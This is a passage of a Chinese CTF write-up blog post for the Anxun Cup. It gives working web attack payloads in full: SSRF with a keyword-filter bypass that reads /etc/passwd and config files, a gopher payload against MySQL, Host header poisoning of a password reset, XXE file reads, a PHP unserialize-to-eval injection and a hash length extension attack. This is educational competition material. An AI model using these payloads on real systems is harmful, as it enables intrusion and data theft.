+<p>利用curl读取文件。尝试url传入：file:///127.0.0.1/etc/passwd<br>if(preg_match(‘/file/‘,$url)){echo “No hacker!”;echo “<br>“;}<br>虽然比较url是否有file关键字，但只是输出信息，没有结束。<br>$url2 = preg_replace(‘/file/‘,’’,$url);<br>preg_replace只是过滤一次file关键字，可双写绕过fifilele，得到file<br>传入POST：url=fifilele://127.0.0.1/etc/passwd<br>读config文件：url=fifilele://localhost/var/www/config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$hosts = &quot;localhost&quot;;</div><div class="line">$dbusername = &quot;test_user&quot;;</div><div class="line">$dbpasswd = &quot;&quot;;</div><div class="line">$dbname = &quot;test&quot;;</div><div class="line">$dbport = 3306;</div><div class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</div><div class="line">function initdb($conn)</div><div class="line">&#123;</div><div class="line">	$dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;</div><div class="line">	if(mysqli_query($conn,$dbinit)) return 1;</div><div class="line">	else return 0;</div><div class="line">&#125;</div><div class="line">function safe($url)</div><div class="line">&#123;</div><div class="line">	$tmpurl = parse_url($url, PHP_URL_HOST);</div><div class="line">	if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)</div><div class="line">	&#123;</div><div class="line">		var_dump($tmpurl);</div><div class="line">		die(&quot;&lt;h1&gt;&lt;p id=&apos;test1&apos;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);</div><div class="line">	&#125;</div><div class="line">	return $url;</div><div class="line">&#125;</div><div class="line">function getUrlContent($url)&#123;</div><div class="line">	$url = safe($url);</div><div class="line">	$url = escapeshellarg($url);</div><div class="line">	$pl = &quot;curl &quot;.$url;</div><div class="line">	echo $pl;</div><div class="line">	$content = shell_exec($pl);</div><div class="line">	return $content;</div><div class="line">&#125;</div><div class="line">initdb($conn);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>知道了mysql的配置内容 gopher一波<br>利用Gopherus工具生成exploit<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="external">https://github.com/tarunkant/Gopherus</a><br><img src="http://img.cdn.cuittk.cn/e6sm6gf0xiozu2qys8768d2cvj.png" alt=""><br>gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01<br><img src="http://img.cdn.cuittk.cn/se77qetu5ix56rjut92ob3z69a.png" alt=""><br>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p>
+<h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p>不要被表象欺骗，钥匙就藏在数据包中<br><a href="http://222.18.158.227:10280/" target="_blank" rel="external">http://222.18.158.227:10280/</a><br>关键点在host Host Header欺骗<br>点忘记密码，burp抓包，把host改为自己的vps，然后看日志<br><img src="http://img.cdn.cuittk.cn/xlpf26yhm5ay8lrdtn6eo9zebq.png" alt=""><br>会发重置密码的token，有效时间有点短，所以迅速复制进去改密码，然后登admin<br>登录后有个输入框<br>随便提交抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</div></pre></td></tr></table></figure></p>
+<p>Xml格式 应该就xxe了<br>Payload<br><img src="http://img.cdn.cuittk.cn/p84ezegrblw61rlj5xfnnpwze6.png" alt=""><br>会发重置密码的token，有效时间有点短，所以迅速复制进去改密码，然后登admin<br>登录后有个输入框<br>随便提交抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</div></pre></td></tr></table></figure></p>
+<p>Xml格式 应该就xxe了<br>Payload<br><img src="http://img.cdn.cuittk.cn/0ojtz03oml2chmo9l5nvztvnuq.png" alt=""><br>外部实体注入  Filter协议读文件  记得base64读<br>拿到flag.php<br>PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==<br>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</div><div class="line">echo &quot;&lt;center&gt;&lt;font size=&apos;5&apos; color=&apos;red&apos;&gt;&quot;;</div><div class="line">echo &quot;You wanna capture this flag?&quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;Oh yes, here!&quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;But now, &quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;Get out!&quot;;</div><div class="line">echo &quot;&lt;/font&gt;&lt;/center&gt;&quot;;</div><div class="line">//flag: D0g3&#123;Hi_D0g3_Res3t_4nd_xXe&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h4><p><a href="http://222.18.158.227:10380/index.php" target="_blank" rel="external">http://222.18.158.227:10380/index.php</a><br>又是买彩票。和之前的qctf一样。也是php弱类型的锅。<br>POST传入{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}<br>每次都能中$5000000，多买几次就能买flag了。<br>Here is your flag: 想上飞船不仅仅是有钱就够了，你还得有智慧，解出这道题，你就可以获救了：一次RSA密钥对生成中，假设p=473398606，q=451141，e=17 求解出d</p>
+<p>python 已知p,q,e求rsa的d<br><a href="https://blog.csdn.net/zyxyzz/article/details/78205321" target="_blank" rel="external">https://blog.csdn.net/zyxyzz/article/details/78205321</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"># coding = utf-8</div><div class="line">def computeD(fn, e):</div><div class="line">    (x, y, r) = extendedGCD(fn, e)</div><div class="line">    #y maybe &lt; 0, so convert it</div><div class="line">    if y &lt; 0:</div><div class="line">        return fn + y</div><div class="line">    return y</div><div class="line">def extendedGCD(a, b):</div><div class="line">    #a*xi + b*yi = ri</div><div class="line">    if b == 0:</div><div class="line">        return (1, 0, a)</div><div class="line">    #a*x1 + b*y1 = a</div><div class="line">    x1 = 1</div><div class="line">    y1 = 0</div><div class="line">    #a*x2 + b*y2 = b</div><div class="line">    x2 = 0</div><div class="line">    y2 = 1</div><div class="line">    while b != 0:</div><div class="line">        q = a / b</div><div class="line">        #ri = r(i-2) % r(i-1)</div><div class="line">        r = a % b</div><div class="line">        a = b</div><div class="line">        b = r</div><div class="line">        #xi = x(i-2) - q*x(i-1)</div><div class="line">        x = x1 - q*x2</div><div class="line">        x1 = x2</div><div class="line">        x2 = x</div><div class="line">        #yi = y(i-2) - q*y(i-1)</div><div class="line">        y = y1 - q*y2</div><div class="line">        y1 = y2</div><div class="line">        y2 = y</div><div class="line">    return(x1, y1, a)</div><div class="line">p = 473398606</div><div class="line">q = 451141</div><div class="line">e = 17</div><div class="line">n = p * q</div><div class="line">fn = (p - 1) * (q - 1)</div><div class="line">d = computeD(fn, e)</div><div class="line">print d</div></pre></td></tr></table></figure></p>
+<p>求得150754621171553<br>D0g3{150754621171553}</p>
+<h4 id="Double-S"><a href="#Double-S" class="headerlink" title="Double-S"></a>Double-S</h4><p>签道题<br><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a><br>源码泄露<a href="http://54.200.169.99:7000/www.zip代码审计" target="_blank" rel="external">http://54.200.169.99:7000/www.zip代码审计</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class Anti</div><div class="line">&#123;</div><div class="line">    public $info;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;info);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">if(isset($_GET[&apos;aa&apos;]))</div><div class="line">&#123;</div><div class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</div><div class="line">    &#123;</div><div class="line">    	$m = new Anti();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">    header(&quot;location:index.html&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;&#125;</div></pre></td></tr></table></figure>
+<p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。<br><img src="http://img.cdn.cuittk.cn/ownfuv1g1egsy7fe1yi2nkoi52.png" alt=""><br>由phpinfo()页面继续可知，session.upload_progress.enabled为On。<br><img src="http://img.cdn.cuittk.cn/1774cramyqzolwreros5q3e1xl.png" alt=""><br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入$_SESSION数据的，这里就利用到了反序列化问题。<br>考虑序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class Anti</div><div class="line">&#123;</div><div class="line">    public $info=&apos;print_r(scandir(dirname(__FILE__)));&apos;;</div><div class="line">&#125;</div><div class="line">$obj = new Anti();</div><div class="line">$a = serialize($obj);</div><div class="line">var_dump($a);</div><div class="line">?&gt;</div><div class="line">//O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</a><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p>
+<h4 id="Hash"><a href="#Hash" class="headerlink" title="Hash!!!"></a>Hash!!!</h4><p>修改响应头<img src="http://img.cdn.cuittk.cn/xbclo5hrrhk6ghemlqbp4dkcpu.png" alt=""><br>Source改为1拿到源码<br><img src="http://img.cdn.cuittk.cn/ur395jrl3qujiy7g69fhn54elj.png" alt=""><br>要么cbc要么hash扩展  用hashpump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Input Signature: c3ef608fdc59d9143c39664ade7556d5</div><div class="line">Input Data: D0g3</div><div class="line">Input Key Length: 20</div><div class="line">Input Data to Add: test</div><div class="line">5e38fe415ce2786f4ae79776038f53ee</div><div class="line">D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test</div></pre></td></tr></table></figure></p>
+<p>将\x改为%，将POST的username改为D0g3，password改为<code>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test</code><br>cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee<br>拿到flag：D0g3{h4sh_1s_s0_diffic1ut_t0_me}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/15/域环境综合渗透过程/" rel="next" title="域环境综合渗透过程">
+                <i class="fa fa-chevron-left"></i> 域环境综合渗透过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/02/汇编语言复习/" rel="prev" title="汇编语言复习">
+                汇编语言复习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一届安洵杯writeup"><span class="nav-number">1.</span> <span class="nav-text">第一届安洵杯writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#这里是签到题"><span class="nav-number">1.1.1.</span> <span class="nav-text">这里是签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#boooooom"><span class="nav-number">1.1.2.</span> <span class="nav-text">boooooom</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-number">1.2.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Hiahiahia"><span class="nav-number">1.2.1.</span> <span class="nav-text">Hiahiahia</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#neko"><span class="nav-number">1.2.2.</span> <span class="nav-text">neko</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">1.3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web1-无限手套"><span class="nav-number">1.3.1.</span> <span class="nav-text">web1-无限手套</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web2"><span class="nav-number">1.3.2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#only-d0g3er-can-see-flag"><span class="nav-number">1.3.3.</span> <span class="nav-text">only d0g3er can see flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BOOM"><span class="nav-number">1.3.4.</span> <span class="nav-text">BOOM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webN"><span class="nav-number">1.3.5.</span> <span class="nav-text">webN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Diglett"><span class="nav-number">1.3.6.</span> <span class="nav-text">Diglett</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Magic-Mirror"><span class="nav-number">1.4.</span> <span class="nav-text">Magic Mirror</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方舟计划"><span class="nav-number">1.4.1.</span> <span class="nav-text">方舟计划</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Double-S"><span class="nav-number">1.4.2.</span> <span class="nav-text">Double-S</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hash"><span class="nav-number">1.4.3.</span> <span class="nav-text">Hash!!!</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
